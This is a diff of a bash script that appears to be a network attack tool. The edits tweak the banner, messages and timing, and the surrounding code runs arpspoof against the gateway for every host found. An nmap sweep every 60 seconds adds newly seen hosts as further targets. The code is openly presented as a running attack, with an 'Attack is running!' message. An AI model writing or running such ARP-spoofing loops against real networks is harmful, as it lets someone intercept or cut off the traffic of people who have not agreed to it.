@@ -205,8 +205,8 @@ func_header()
     printtitle "${CGrn}| ${CSYel}##  ${CGrn}| ${CSYel}## ${CGrn}\____  ${CSYel}##  ${CGrn}| ${CSYel}## ${CGrn}/${CSYel}##${CGrn}| ${CSYel}##  ${CGrn}| ${CSYel}##${CGrn}| ${CSYel}##      ${CGrn}| ${CSYel}##  ${CGrn}| ${CSYel}##"
     printtitle "${CGrn}|  ${CSYel}####### ${CGrn}/${CSYel}#######${CGrn}/  |  ${CSYel}####${CGrn}/|  ${CSYel}######${CGrn}/| ${CSYel}##      ${CGrn}| ${CSYel}#######${CGrn}/"
     printtitle " ${CGrn}\_______/|_______/    \___/   \______/ |__/      |_______/ ${CClr}"
-    printtitle ""
-    printtitle "${CYel}Author: ${CUBlu}R7FX${CYel}, ${CUBlu}MrSyhd${CClr}                             ${CYel}version${CRed} $VERSION${CClr}"
+    printtitle "                                                            "
+    printtitle "${CYel}Author: ${CUBlu}R7FX${CYel}, ${CUBlu}MrSyhd${CClr}                         ${CYel}version${CRed} $VERSION${CClr}"
     printtitle ""
     printtitle ""
     echo
@@ -322,6 +322,8 @@ func_cleanup()
         # Requesting new IP Address
         dhclient $INTERFACE > /dev/null 2>&1 
     fi
+
+    echo -ne "${CClr}" 
 
     tput cnorm
 
@@ -462,9 +464,18 @@ func_start_attack()
         arpspoof -rt $IP $GATEWAY > /dev/null 2>&1 &
     done
 
+    echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}]${CGrn} Attack is running!${CClr}"
+
+    RESCANNING_DELAY=60
+
+    sleep 5
+
+    echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}]${CYel} Rescanning targets every ${CGrn}$RESCANNING_DELAY${CYel} seconds${CClr}"
+
     # Loop and discover new targets
     while true
     do
+        sleep $RESCANNING_DELAY  # Nmap scan can interfere with arpspoof, so don't do it too often
         NEW_SCAN=$(nmap -sn $NETWORK --disable-arp-ping | grep "for" | cut -d ' ' -f 5-)
 
         while read -r RESULT
@@ -475,13 +486,12 @@ func_start_attack()
 
             if ! echo $TARGET_IP | grep -qw "$IP"
             then
-                echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}]${CYel} Discovered new target: ${CGrn}$IP${CClr}"
+                echo -e "${CGrn}[${CYel}$(date '+%T')${CGrn}]${CYel} Found new target: ${CGrn}$IP${CClr}"
                 arpspoof -rt $IP $GATEWAY > /dev/null 2>&1 &
                 [[ $FORWARD_TRAFFIC == true && $RATE_LIMIT != "Unlimited" ]] && func_add_rate_limit_target $IP
                 TARGET_IP="$TARGET_IP $IP"
             fi
         done < <(echo "$NEW_SCAN")
-        sleep 60  # Nmap scan can interrupt with arpspoof, so don't do it too often
     done
 }
 
@@ -756,7 +766,7 @@ do
 done
 
 # If there is an invalid IP Address then exit
-[[ ! -z $INVALID_IP ]] && exit 1
+[[ ! -z $INVALID_IP ]] && echo && exit 1
 
 # Get all of your IP Addresses and add to exclusion list
 MY_IP=$(ip -o -4 a | awk '{print $4 }' | cut -d '/' -f1 | grep -v ^127 | tr '\n' ' ')
